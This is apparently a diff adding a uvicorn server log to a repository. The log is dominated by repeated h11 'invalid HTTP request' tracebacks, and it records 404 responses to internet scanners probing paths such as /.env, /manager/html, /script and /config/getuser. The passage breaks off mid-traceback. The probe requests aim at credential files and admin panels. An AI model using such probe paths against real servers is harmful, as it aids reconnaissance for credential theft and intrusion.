+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:36822 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:32960 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     209.17.97.18:50240 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:41110 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     125.64.94.142:44928 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:53158 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:58228 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     209.126.82.64:56543 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     209.126.82.64:56560 - "POST / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:60088 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:53392 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     95.216.17.210:44034 - "GET / HTTP/1.1" 404 Not Found
+INFO:     161.35.117.45:56720 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     142.93.12.43:37484 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:40020 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:41420 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 73, in maybe_read_from_IDLE_client
+    request_line_re, lines[0], "illegal request line: {!r}", lines[0]
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 88, in validate
+    raise LocalProtocolError(msg)
+h11._util.RemoteProtocolError: illegal request line: bytearray(b'\x16\x03\x01\x01\xa7\x01\x00\x01\xa3\x03\x03\x98K\x04\xa6kVJ6%\xa6\xf0j\xfeq\x81\xc8\xad\xe67\xe2\xe9\xc7dv\x9b;j\xea\x98\xeeCv \xdf\xb60\xc7\x88\x18\xb0\xa1v\xf7\x1b\xe6\xcd\x93i\x04\x8c&\x91\x95\xd0.\xcc\xf8\xb6>?\xd4.\xf9\x1c\t\x00\x8c')
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:60474 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:52952 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:54240 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:59716 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:56888 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:33708 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:35570 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:42576 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
